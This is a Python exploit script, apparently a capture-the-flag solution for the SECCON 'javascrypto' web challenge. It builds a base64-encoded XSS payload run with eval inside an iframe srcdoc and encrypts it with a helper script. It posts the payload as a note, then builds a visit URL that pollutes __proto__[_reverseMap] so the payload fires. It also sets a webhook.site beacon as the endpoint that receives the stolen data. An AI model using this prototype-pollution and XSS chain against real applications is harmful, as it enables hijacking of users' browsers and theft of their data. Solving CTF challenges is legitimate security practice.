import requests
import json
import asyncio
import base64
import subprocess

# CHALL_URL='http://localhost:3000'
CHALL_URL='http://javascrypto.seccon.games:3000'
BEACON = "http://webhook.site/<webhook_loc>"
# TARGET_URL='http://javascrypto.seccon.games:3000'
TARGET_URL='http://web:3000'

async def main():
    with open("xss_script.js", "r") as f:
        script = f.read()
        script = script.replace("{{BEACON_PLACEHOLDER}}", BEACON).replace("{{TARGET_PLACEHOLDER}}", TARGET_URL)
    xss_link = gen_xss_payload(script)
    with open("attack/controller_template.js", "r") as f:
        controller_template = f.read() 
        controller_template = controller_template.replace("{{XSS_PLACEHOLDER}}", xss_link).replace("{{BEACON_PLACEHOLDER}}", BEACON)
    with open("attack/controller.js", "w") as f:
        f.write(controller_template)
        
def gen_xss_payload(script): # takes raw script
    script = base64.b64encode(script.encode()).decode()
    orig_text = f"""<iframe srcdoc="<script>eval(atob('{script}'));</script>"></iframe>"""
    output = subprocess.check_output(f"node gen_crypto.js {base64.b64encode(orig_text.encode()).decode()}", shell=True)
    output = output.decode()
    parts = output.split("\n\n")
    reverse_map = json.loads(parts[0])
    iv = parts[1].strip()
    ciphertext = parts[2].strip()
    ciphertext = base64.b64decode(ciphertext).decode('latin1')
    
    r = requests.post(f"{CHALL_URL}/note", json={
        'iv': iv,
        'ciphertext': ciphertext,
    })
    id = r.json()['id']
    visit_url = f"{TARGET_URL}?"
    for k, v in reverse_map.items():
        visit_url += f"__proto__[_reverseMap][{k}]={v}&"
    visit_url += f"id={id}" 
    return visit_url


if __name__ == '__main__':
    asyncio.run(main())